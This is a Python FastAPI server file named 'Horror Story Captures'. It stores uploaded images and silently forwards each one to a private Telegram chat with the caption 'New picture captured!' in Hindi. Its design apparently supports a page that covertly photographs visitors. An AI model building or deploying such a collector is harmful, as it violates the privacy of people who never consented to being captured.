import os
import io
import uuid
import sqlite3
from datetime import datetime
from pathlib import Path

from dotenv import load_dotenv
from fastapi import FastAPI, File, UploadFile, HTTPException, Query, BackgroundTasks
from fastapi.responses import FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from PIL import Image
import httpx

# Load .env locally
load_dotenv()

app = FastAPI(title="Horror Story Captures")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ─── TELEGRAM CONFIG ─────────────────────────────

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

TELEGRAM_CONFIGURED = bool(
    BOT_TOKEN
    and CHAT_ID
    and BOT_TOKEN != "YOUR_BOT_TOKEN_HERE"
    and CHAT_ID != "YOUR_CHAT_ID_HERE"
)

if TELEGRAM_CONFIGURED:
    print("Telegram configured successfully")
else:
    print("WARNING: Telegram configuration missing!")


# ─── VERCEL TEMP STORAGE ─────────────────────────

STORAGE_DIR = Path("/tmp/captured")
STORAGE_DIR.mkdir(parents=True, exist_ok=True)

DB_PATH = "/tmp/captures.db"


# ─── DATABASE ────────────────────────────────────

def get_db_connection():
    return sqlite3.connect(DB_PATH)


def init_db():
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("""
        CREATE TABLE IF NOT EXISTS images (
            id TEXT PRIMARY KEY,
            filename TEXT,
            timestamp TEXT
        )
    """)

    conn.commit()
    conn.close()


def save_meta(id: str, filename: str, timestamp: str):
    conn = get_db_connection()
    c = conn.cursor()

    c.execute(
        "INSERT INTO images VALUES (?, ?, ?)",
        (id, filename, timestamp)
    )

    conn.commit()
    conn.close()


def get_all_meta():
    conn = get_db_connection()
    c = conn.cursor()

    c.execute("""
        SELECT id, filename, timestamp
        FROM images
        ORDER BY timestamp DESC
    """)

    rows = c.fetchall()
    conn.close()

    return [
        {
            "id": row[0],
            "filename": row[1],
            "timestamp": row[2]
        }
        for row in rows
    ]


init_db()


# ─── IMAGE COMPRESSION ───────────────────────────

def compress_image(
    image_bytes: bytes,
    max_size=(800, 800),
    quality=75
):
    try:
        img = Image.open(io.BytesIO(image_bytes))

        if img.mode in ("RGBA", "P"):
            img = img.convert("RGB")

        img.thumbnail(max_size, Image.LANCZOS)

        out = io.BytesIO()

        img.save(
            out,
            format="JPEG",
            quality=quality,
            optimize=True
        )

        return out.getvalue()

    except Exception as e:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid image: {str(e)}"
        )


# ─── TELEGRAM ─────────────────────────────────────

async def send_photo_to_telegram(
    image_bytes: bytes,
    filename: str = "capture.jpg"
):
    if not TELEGRAM_CONFIGURED:
        print("Telegram not configured")
        return False

    try:
        print(f"Sending {filename} to Telegram...")

        url = (
            f"https://api.telegram.org/"
            f"bot{BOT_TOKEN}/sendPhoto"
        )

        current_time = datetime.now().strftime(
            "%Y-%m-%d %H:%M:%S"
        )

        data = {
            "chat_id": CHAT_ID,
            "caption": (
                f"नई तस्वीर कैप्चर हुई!\n"
                f"समय: {current_time}\n"
                f"फाइल: {filename}"
            )
        }

        files = {
            "photo": (
                filename,
                image_bytes,
                "image/jpeg"
            )
        }

        async with httpx.AsyncClient(
            timeout=30.0
        ) as client:

            response = await client.post(
                url,
                data=data,
                files=files
            )

        print(
            f"Telegram status: "
            f"{response.status_code}"
        )

        if response.status_code == 200:
            result = response.json()

            if result.get("ok"):
                print("Telegram photo sent!")
                return True

            print(
                "Telegram API error:",
                result.get("description")
            )
            return False

        print(
            "Telegram HTTP error:",
            response.text[:300]
        )

        return False

    except Exception as e:
        print(
            f"Telegram error: "
            f"{type(e).__name__}: {str(e)}"
        )
        return False


# ─── CAPTURE ──────────────────────────────────────

@app.post("/capture")
async def capture_image(
    background_tasks: BackgroundTasks,
    file: UploadFile = File(...)
):
    try:
        contents = await file.read()

        if not contents:
            raise HTTPException(
                status_code=400,
                detail="Empty file"
            )

        # Compress
        compressed = compress_image(contents)

        # Generate ID
        file_id = str(uuid.uuid4())[:8]

        timestamp = datetime.now().strftime(
            "%Y%m%d_%H%M%S"
        )

        filename = (
            f"capture_{timestamp}_{file_id}.jpg"
        )

        filepath = STORAGE_DIR / filename

        # Save temporarily
        with open(filepath, "wb") as f:
            f.write(compressed)

        # Save metadata
        save_meta(
            file_id,
            filename,
            timestamp
        )

        # Telegram
        if TELEGRAM_CONFIGURED:
            background_tasks.add_task(
                send_photo_to_telegram,
                compressed,
                filename
            )

        return {
            "success": True,
            "id": file_id,
            "filename": filename,
            "telegram_configured": TELEGRAM_CONFIGURED
        }

    except HTTPException:
        raise

    except Exception as e:
        print(
            f"Capture failed: "
            f"{type(e).__name__}: {str(e)}"
        )

        raise HTTPException(
            status_code=500,
            detail="Image processing failed"
        )


# ─── GET IMAGES ───────────────────────────────────

@app.get("/images")
async def get_images(
    offset: int = Query(0, ge=0),
    limit: int = Query(6, ge=1, le=20)
):
    all_meta = get_all_meta()

    paginated = all_meta[
        offset:offset + limit
    ]

    result = []

    for m in paginated:
        result.append({
            "id": m["id"],
            "url": f"/share/{m['id']}",
            "timestamp": m["timestamp"]
        })

    return {
        "images": result,
        "total": len(all_meta),
        "offset": offset,
        "limit": limit,
        "has_more": (
            offset + limit < len(all_meta)
        )
    }


# ─── SHARE IMAGE ──────────────────────────────────

@app.get("/share/{file_id}")
async def share_image(file_id: str):

    for meta in get_all_meta():

        if meta["id"] == file_id:

            filepath = (
                STORAGE_DIR / meta["filename"]
            )

            if not filepath.exists():
                raise HTTPException(
                    status_code=404,
                    detail="Image expired"
                )

            return FileResponse(
                filepath,
                media_type="image/jpeg"
            )

    raise HTTPException(
        status_code=404,
        detail="Image not found"
    )


# ─── HEALTH ───────────────────────────────────────

@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "telegram_configured": TELEGRAM_CONFIGURED,
        "bot_token_present": bool(BOT_TOKEN),
        "chat_id_present": bool(CHAT_ID)
    }
